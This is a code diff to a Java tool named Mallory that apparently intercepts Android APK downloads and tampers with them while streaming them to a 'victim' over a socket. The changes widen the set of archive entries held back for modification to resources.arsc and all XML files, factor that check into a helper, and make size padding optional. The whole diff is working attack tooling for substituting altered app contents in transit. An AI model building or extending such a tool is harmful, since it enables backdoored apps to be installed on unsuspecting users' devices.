@@ -65,6 +65,7 @@ public class Mallory {
     public static final String ANDROID_MANIFEST = "AndroidManifest.xml";
     public static final String CLASSES = "classes.dex";
     public static final String META_INF = "META-INF";
+    public static final String RESOURCES = "resources.arsc";
     
     // receives other command line parameters than options
     @Argument
@@ -89,11 +90,11 @@ public class Mallory {
     @Option(name = "--zip-align", aliases = {"-z"}, usage = "Apply ZIP align on resulting APK (stream output).")
     private boolean zipAlign = false;
     
-    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes. By default size(original_APK)+"+DEFAULT_PADDING_EXTRA+".")
+    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes. By default size(original_APK)+0.")
     private long outBytes = 0;
     
     @Option(name = "--padd-extra", aliases = {"-p"}, usage = "Desired padding of the resulting APK in bytes. Is used only if output-size is zero.\nsize(out_APK) = size(original_APK) + padd_extra.")
-    private long paddExtra = DEFAULT_PADDING_EXTRA;
+    private long paddExtra = 0;
     
     private static Mallory runningInstance;
     public static void main(String[] args) {
@@ -274,9 +275,7 @@ public class Mallory {
             
             // META-INF files should be always on the end of the archive, 
             // thus add postponed files right before them
-            if (curName.startsWith(META_INF)
-                 || CLASSES.equalsIgnoreCase(curName)
-                 || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
+            if (isPostponed(curName)){
                 // Capturing interesting files for us and store for later.
                 // If the file is not interesting, send directly to the stream.
                 if (!quiet)
@@ -304,6 +303,7 @@ public class Mallory {
         // zop strem (socket to the victim). Now APK transformation will
         // be performed, diff, sending rest of the files to zop.
         // 
+        boolean doPadding = paddExtra > 0 || outBytes > 0;
         long flen = tempApk.length();
         if (outBytes<=0){
             outBytes = flen + paddExtra;
@@ -404,7 +404,7 @@ public class Mallory {
         
         // Determine number of bytes to add to APK.
         // padlen is number of bytes missing in APK to meet desired size in bytes.
-        padlen = outBytes - (writtenAfterCentralDir + endOfCentralDir);
+        padlen = doPadding ? (outBytes - (writtenAfterCentralDir + endOfCentralDir)) : 0;
         
         // Compute number of files needed for padding.
         int padfiles = (int) Math.ceil((double)padlen / (double)(PAD_BLOCK_MAX));
@@ -454,12 +454,12 @@ public class Mallory {
                     padlen, writtenReally + endOfCentralDir, outBytes));
         
         // Should always be same
-        if (!quiet && writtenBeforeDiff!=writtenBeforeDiff2){
+        if (!quiet && doPadding && writtenBeforeDiff!=writtenBeforeDiff2){
             System.err.println(String.format("Warning! Size before merge from pass1 and pass2 does not match."));
         }
         
         // If size is different, something went wrong.
-        if (!quiet && ((writtenReally + endOfCentralDir) != outBytes)){
+        if (!quiet && doPadding && ((writtenReally + endOfCentralDir) != outBytes)){
             System.err.println(String.format("Warning! Output size differs from desired size."));
         }
         
@@ -468,6 +468,19 @@ public class Mallory {
         
         if (!quiet)
             System.err.println("THE END!");
+    }
+    
+    /**
+     * Returns true if given file name should be postponed (is modified in tampering process).
+     * @param curName 
+     * @return  
+     */
+    public boolean isPostponed(String curName){
+        return (curName.startsWith(META_INF)
+                 || CLASSES.equalsIgnoreCase(curName)
+                 || ANDROID_MANIFEST.equalsIgnoreCase(curName)
+                 || RESOURCES.equalsIgnoreCase(curName)
+                 || curName.endsWith(".xml"));
     }
     
     /**
@@ -596,6 +609,7 @@ public class Mallory {
                 // All files are read linary from the new APK file
                 // thus it will be put to the archive in the right order.
                 PostponedEntry oldEntry = alMap.get(curName);
+                boolean wasPostponed = isPostponed(curName);
                 if (  (oldEntry.hashByte==null && al.hashByte!=null)
                    || (oldEntry.hashByte!=null && oldEntry.hashByte.equals(al.hashByte)==false)    
                    || (oldEntry.hashDefl==null && al.hashDefl!=null)
@@ -607,6 +621,10 @@ public class Mallory {
                         System.err.println("Detected modified file ["+curName+"] written prior dump: " + zop.getWritten());
                         System.err.println("  t1=" + oldEntry.hashByte.equals(al.hashByte) + "; t2=" + oldEntry.hashDefl.equals(al.hashDefl));
                     }
+                    
+                    if (!wasPostponed && !quiet){
+                        System.err.println("  Warning: This file was already sent to the victim!!!");
+                    }
 
                     // Apply padding
                     if (padd2add>0){
@@ -617,9 +635,7 @@ public class Mallory {
                     
                     al.dump(zop);
 
-                } else if (curName.startsWith(META_INF)
-                        || CLASSES.equalsIgnoreCase(curName)
-                        || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
+                } else if (wasPostponed){
                     // File was not modified but is one of the postponed files, thus has to 
                     // be flushed also.
                     if (!quiet)
